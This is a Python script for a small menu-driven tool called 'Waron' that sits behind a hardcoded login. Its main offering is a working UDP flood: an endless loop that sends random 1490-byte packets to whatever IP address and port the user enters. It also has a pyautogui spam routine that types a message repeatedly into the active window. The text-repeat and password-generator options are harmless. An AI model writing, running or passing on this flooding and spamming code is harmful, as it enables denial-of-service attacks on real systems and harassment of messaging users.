import socket
import sys
import os
import random
import string
import pyautogui
from time import sleep

#Banner Area
banner = ''' 
\033[0;32m
            ▄▄██████████▄▄
        ▄████████████████████▄
      ▄█████████████████████████
    ▄█████████████████████████████
   ████████████▀  ▄▄▄ ▀████████████
  ████████████   ████▌  ████████████     Author   : Md. Ridwanul Islam Muntakim
  █████▄    █   ██████   █    ▄█████▌    Tool Name: Waron
 ████████   ▌   █▀  ▀█   █   ████████    Version  : 0.01
 █████████  ▌   ▌ ██▄       █████████    We Are The Greatest Fear Of Our Enemies
 ██████████▄█   ██████     ██████████    
 ▐███████████▌  ██████  ▄▄██████████
   ████████████  ▀███  ▄███████████▀
    █████████████▄▄▄▄█████████████▀
     ▀██████████████████████████▀
       ▀██████████████████████▀
          ▀▀██████████████▀▀
'''
print(banner)

#User Details
waronusername = ("waron -- user")
waronpassword = ("waron -- password")
username = input("Enter Username: \nuser@waron:~# ")
password = input("Enter Password: \nuser@waron:~# ")

#Functions
def runsupportbot():
    usage = ("DDOS Example: \n------------- \nTarget IP Address: 127.0.0.1 \nTarget Port Number: 80 \n \nBombing Example: \n---------------- \nBombing Numbers: 500 \nBombing Text: Waron is here \n \nText Repeat Example: \n-------------------- \nRepeat Numbers: 100 \nRepeat Text: Waron is here \n \nStrong Password Generate Example: \n---------------------------------\nPassword Lenght: 100")
    print(usage)
    sys.exit()

def warontoolsname():
    print("[i] Select Tool:")
    print("-"*16)
    tools = ["[1] DDOS Attack", "[2] Bombing", "[3] Text Repeat", "[4] Strong Password Generate"]
    index = 0
    lenght = 4
    while index < lenght:
        print(tools[index])
        index = index + 1

def runwaronddos():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    targetipaddress = input("Enter Target IP Address: \nuser@waron:~# ")
    targetportnumber = int(input("Enter Target Port Number: \nuser@waron:~# "))
    trafficsent = 0
    while True:        
        sock.sendto(bytes, (targetipaddress,targetportnumber))
        trafficsent = trafficsent + 1
        print(f"Successfully {trafficsent} harm traffics sent to {targetipaddress}")
        if targetportnumber == 65534:            
            targetportnumber = 1

def runwaronbomb():
    bomb = 1
    numberofbomb = int(input("Number Of Bomb: \nuser@waron:~# "))
    bombtext = input("Enter Bomb Text: \nuser@waron:~# ")
    sleep(3)
    while bomb <= numberofbomb:
        pyautogui.typewrite(bombtext)
        pyautogui.typewrite("\n")
        bomb = bomb + 1
    print("[i] Attack Complete")

def runwarontextrepeat():
    textcount = 1
    numberoftext = int(input("Number Of Text: \nuser@waron:~# "))
    text = input("Enter Text: \nuser@waron:~# ")
    while textcount <= numberoftext:
        print(text)
        textcount = textcount + 1

def runwaronpasswordgenerate():
    passwordlenght = int(input("Enter Password Lenght: \nuser@waron:~# "))
    adduppercase = string.ascii_uppercase
    addlowercase = string.ascii_lowercase
    adddigits = string.digits
    addpunctuation = string.punctuation
    adduppercaseandlowercase = adduppercase + addlowercase
    uppercaseandlowercaselist = []
    for upperandlower in adduppercaseandlowercase:
        uppercaseandlowercaselist.append(upperandlower)
    random.shuffle(uppercaseandlowercaselist)
    uppercaseandlowercasejoined = "".join(uppercaseandlowercaselist[:500])
    digitslist = []
    for digits in adddigits:
        digitslist.append(digits)
    random.shuffle(digitslist)
    digitsjoined = "".join(digitslist[:500])
    punctuationlist = []
    for punctuation in addpunctuation:
        punctuationlist.append(punctuation)
    random.shuffle(punctuationlist)
    punctuationjoined = "".join(punctuationlist[:500])
    addall = uppercaseandlowercasejoined + digitsjoined + punctuationjoined
    passwordlist = []
    for passwords in addall:
        passwordlist.append(passwords)
    random.shuffle(passwordlist)
    passwordsjoined = "".join(passwordlist[:passwordlenght])
    print(f"Your Password: {passwordsjoined}")

#Control Details
if waronusername == username and waronpassword == password:
    print("Login Successfully")
    sleep(3)
    os.system("clear")
    print(banner)
    actionsupportbot = input("Need Usage Details: \nuser@waron:~# ")
    if actionsupportbot == "yes":
        runsupportbot() 
    elif actionsupportbot == "no":
        warontoolsname()
        selectiontool = int(input("user@waron:~# "))
        if selectiontool == 1:
            runwaronddos()
        elif selectiontool == 2:
            runwaronbomb()
        elif selectiontool == 3:
            runwarontextrepeat()
        elif selectiontool == 4:
            runwaronpasswordgenerate()  
        else:
            print("\033[0;31m[x] Wrong Tool Selection")
    else:
        print("\033[0;31m[x] Wrong Command")
        sys.exit()
else:
    print("\033[0;31m[x] Wrong Login Information")
    sys.exit()